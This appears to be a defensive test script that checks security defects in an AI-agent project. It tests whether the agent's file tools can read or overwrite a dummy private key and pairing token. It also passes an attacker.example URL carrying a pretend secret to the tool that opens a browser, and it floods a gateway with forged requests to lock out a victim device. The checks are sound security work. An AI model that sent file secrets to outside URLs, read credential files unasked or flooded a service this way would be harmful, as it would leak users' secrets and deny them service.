"""Scratch validation of V1 defects D-04, D-05, D-07, D-08, D-09 and kill/abort
semantics. Temp dirs + fakes only. No network, no real state, no browser."""
import json, os, sys, tempfile, threading, time, webbrowser
from pathlib import Path
sys.path.insert(0, r"C:\V.O.I.D\.claude\worktrees\void-v2-initialization-57bfb6")

from void.actions.apps import AppActions
from void.actions.base import Tool, ToolResult
from void.actions.files import FileActions
from void.actions.registry import ToolRegistry
from void.core.agent import Agent
from void.core.kill_switch import KillSwitch
from void.core.task import TaskStore
from void.providers.base import LLMProvider, LLMResponse, ToolCall
from void.providers.registry import ProviderRegistry
from void.security.risk import RiskGate, RiskLevel

import logging
_log_lines = {"n": 0}
class _Count(logging.Handler):            # count (not print) log records: a flood is itself a finding
    def emit(self, record): _log_lines["n"] += 1
logging.getLogger().handlers[:] = [_Count()]; logging.getLogger().setLevel(logging.INFO)
tmp = Path(tempfile.mkdtemp(prefix="void_validate_"))
print("temp root:", tmp, "\n")

# ---------------------------------------------------------------- D-04
print("== D-04: can file tools reach a 'V.O.I.D state dir' inside allowed_roots? ==")
home = tmp / "home"; state = home / ".void"; state.mkdir(parents=True)
(state / "device_key.pem").write_text("-----BEGIN PRIVATE KEY-----\nDUMMY-NOT-A-REAL-KEY\n")
(state / "pairing_window.json").write_text('{"token":"DUMMYTOKEN","expires_at":9e9}')
(state / "devices.json").write_text("{}")
fa = FileActions(allowed_roots=[home.parent], delete_to_recycle_bin=True, protected_roots=[])
reg = ToolRegistry(); reg.register_all(fa.tools())
gate = RiskGate()  # no confirm_fn == unattended (voice/persistent runtime)
def try_tool(name, args):
    t = reg.get(name); risk = t.effective_risk(args)
    allowed = gate.authorize(risk, f"{name}", None)
    res = reg.execute(name, args) if allowed else None
    return risk.name, allowed, (res.summary[:60].replace("\n", " ") if res else "(blocked by gate)")
print(" read_file(device_key.pem)      ->", try_tool("read_file", {"path": str(state / "device_key.pem")}))
print(" read_file(pairing_window.json) ->", try_tool("read_file", {"path": str(state / "pairing_window.json")}))
print(" write_file(devices.json, overwrite) ->", try_tool("write_file", {"path": str(state / "devices.json"), "content": "{}", "overwrite": True}))
print(" write_file(STOP, new file)     ->", try_tool("write_file", {"path": str(state / "STOP"), "content": "x"}))
print(" delete_file(devices.json)      ->", try_tool("delete_file", {"path": str(state / "devices.json")}))

# ---------------------------------------------------------------- D-05
print("\n== D-05: open_path with an attacker URL (webbrowser.open patched; nothing opens) ==")
opened = []
webbrowser.open = lambda url, *a, **k: opened.append(url) or True
aa = AppActions(fa)
reg2 = ToolRegistry(); reg2.register_all(aa.tools())
t = reg2.get("open_path")
url = "https://attacker.example/collect?d=PRETEND_SECRET_FROM_A_FILE"
risk = t.effective_risk({"target": url})
print(" static risk:", risk.name, "| terminal_on_success:", t.terminal_on_success,
      "| gate.authorize (unattended):", gate.authorize(risk, "open_path", None))
res = reg2.execute("open_path", {"target": url})
print(" executed ok:", res.ok, "| URL handed to browser:", opened)

# ---------------------------------------------------------------- D-07
print("\n== D-07: cloud 'available' but unreachable; is the local provider ever used? ==")
class Cloud(LLMProvider):
    name = "gemini"; calls = 0
    def available(self): return True          # what V1's available() reports: SDK + key present
    def generate(self, messages, tools=None):
        Cloud.calls += 1; raise ConnectionError("network unreachable (simulated)")
class Local(LLMProvider):
    name = "local"; calls = 0
    def available(self): return True
    def generate(self, messages, tools=None):
        Local.calls += 1; return LLMResponse(text="done locally")
import void.core.agent as agent_mod
slept = []; agent_mod.time.sleep = lambda s: slept.append(s)      # don't actually wait
prov = ProviderRegistry({"gemini": Cloud(), "local": Local()}, ["gemini", "local"])
chosen = prov.select()
store = TaskStore(tmp / "t.sqlite")
ag = Agent(chosen, ToolRegistry(), RiskGate(), KillSwitch(), store, defer_confirmation=True)
r = ag.run("open notepad")
print(f" selected: {chosen.name} | cloud attempts: {Cloud.calls} | local calls: {Local.calls} "
      f"| retry sleeps: {slept} | task status: {r.status} | error: {(r.task.error or '')[:50]}")

# ---------------------------------------------------------------- D-08
print("\n== D-08: google-genai (installed) HTTP timeout / thinking / streaming surface ==")
try:
    from google import genai
    from google.genai import types
    t0 = time.perf_counter(); c = genai.Client(api_key="DUMMY-KEY-NO-NETWORK"); dt = (time.perf_counter() - t0) * 1000
    ho = getattr(getattr(c, "_api_client", None), "_http_options", None)
    print(f" Client construction: {dt:.1f} ms (per call in V1)")
    print(" default http_options.timeout:", getattr(ho, "timeout", "n/a"))
    print(" ThinkingConfig fields:", list(types.ThinkingConfig.model_fields))
    print(" HttpOptions fields (timeout/retry):", [f for f in types.HttpOptions.model_fields if f in ("timeout", "retry_options")])
    print(" has generate_content_stream:", hasattr(c.models, "generate_content_stream"))
except Exception as e:
    print(" introspection failed:", type(e).__name__, e)

# ---------------------------------------------------------------- D-09
print("\n== D-09: request rate-limiter state growth from UNAUTHENTICATED requests ==")
from void.config import Config
from void.device.gateway import DeviceGateway
gw = DeviceGateway(Config({"app": {"name": "x", "version": "1"}, "voice": {"enabled": False}}),
                   ToolRegistry(), RiskGate(), KillSwitch(), tmp / "gw", host="127.0.0.1", port=0)
def body(i):
    return json.dumps({"protocol": 1, "request_id": f"r{i}", "device_id": f"attacker-{i}",
                       "operation": "get_status", "parameters": {}, "timestamp": time.time()}).encode()
before = len(gw._request_limiter._events)
codes = {}
for i in range(5000):
    s, _ = gw.handle_request(body(i), "sig", "203.0.113.9")
    codes[s] = codes.get(s, 0) + 1
print(f" limiter keys before={before} after 5000 unauthenticated requests={len(gw._request_limiter._events)} | http codes={codes}")
print(f" log records emitted by those 5000 unauthenticated requests: {_log_lines['n']} (one WARNING each; void.log is a non-rotating FileHandler)")
# victim lock-out: attacker spends the victim's per-device budget with bad signatures
victim = "victim-device-id"
for i in range(40):
    gw.handle_request(json.dumps({"protocol": 1, "request_id": f"v{i}", "device_id": victim, "operation": "get_status",
                                  "parameters": {}, "timestamp": time.time()}).encode(), "badsig", "203.0.113.9")
s, p = gw.handle_request(json.dumps({"protocol": 1, "request_id": "legit", "device_id": victim, "operation": "get_status",
                                     "parameters": {}, "timestamp": time.time()}).encode(), "badsig", "198.51.100.7")
print(" after 40 forged requests naming the victim's id, a request naming it gets HTTP", s,
      "(429 = victim rate-limited by an unauthenticated third party)")

# ---------------------------------------------------------------- kill during tool
print("\n== Kill/abort while a tool is executing (cooperative cancellation) ==")
ks = KillSwitch()
started = threading.Event()
def slow(**kw):
    started.set(); time.sleep(1.5); return ToolResult.success("slow tool finished")
r3 = ToolRegistry(); r3.register(Tool(name="slow_tool", description="d", parameters={"type": "object"}, handler=slow, risk=RiskLevel.LOW))
class Script(LLMProvider):
    name = "script"; n = 0
    def available(self): return True
    def generate(self, messages, tools=None):
        Script.n += 1
        return LLMResponse(tool_calls=[ToolCall(name="slow_tool", arguments={})]) if Script.n == 1 else LLMResponse(text="ok")
agent_mod.time.sleep = time.sleep
threading.Thread(target=lambda: (started.wait(), time.sleep(0.2), ks.engage("scratch stop")), daemon=True).start()
t0 = time.perf_counter()
r4 = Agent(Script(), r3, RiskGate(), ks, TaskStore(tmp / "k.sqlite")).run("x")
print(f" stop engaged 0.2 s into a 1.5 s tool -> agent returned after {time.perf_counter()-t0:.2f}s | status={r4.status} "
      f"| ledger={[e['status'] for e in r4.task.plan]} (tool ran to completion; the *next* step was prevented)")
print("\nDONE")
